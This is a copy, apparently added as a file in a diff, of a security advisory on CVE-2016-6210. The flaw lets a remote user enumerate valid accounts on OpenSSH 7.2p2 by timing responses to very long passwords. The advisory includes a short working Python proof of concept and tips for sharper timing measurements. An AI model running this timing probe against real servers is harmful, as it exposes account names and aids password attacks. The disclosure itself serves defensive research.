@@ -1,0 +1,56 @@
+Source: http://seclists.org/fulldisclosure/2016/Jul/51
+
+--------------------------------------------------------------------
+User Enumeration using Open SSHD (<=Latest version).
+-------------------------------------------------------------------
+
+Abstract:
+-----------
+By sending large passwords, a remote user can enumerate users on system that runs SSHD. This problem exists in most 
+modern configuration due to the fact that it takes much longer to calculate SHA256/SHA512 hash than BLOWFISH hash.
+
+CVE-ID
+---------
+CVE-2016-6210
+
+Tested versions
+--------------------
+This issue was tested on : opensshd-7.2p2 ( should be possible on most earlier versions as well).
+
+Fix
+-----------------
+This issue was reported to OPENSSH developer group and they have sent a patch ( don't know if patch was released yet).
+(thanks  to  'dtucker () zip com au' for his quick reply and fix suggestion).
+
+Details
+----------------
+When SSHD tries to authenticate a non-existing user, it will pick up a fake password structure hardcoded in the SSHD 
+source code. On this hard coded  password  structure  the password hash is based on BLOWFISH ($2) algorithm.
+If real users passwords are hashed using SHA256/SHA512, then sending large passwords (10KB)  will result in shorter 
+response time from the server for non-existing users.
+
+Sample code:
+----------------
+import paramiko
+import time
+user=raw_input("user: ")
+p='A'*25000
+ssh = paramiko.SSHClient()
+starttime=time.clock()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+try:
+        ssh.connect('127.0.0.1', username=user,
+        password=p)
+except:
+        endtime=time.clock()
+total=endtime-starttime
+print(total)
+
+(Valid users will result in higher total time).
+
+*** please note that if SSHD configuration prohibits root login , then root is not considered as valid user...
+
+*** when TCP timestamp option is enabled the best way to measure the time would be using timestamps from the TCP 
+packets of the server, since this will eliminate any network delays on the way.
+
+Eddie Harari
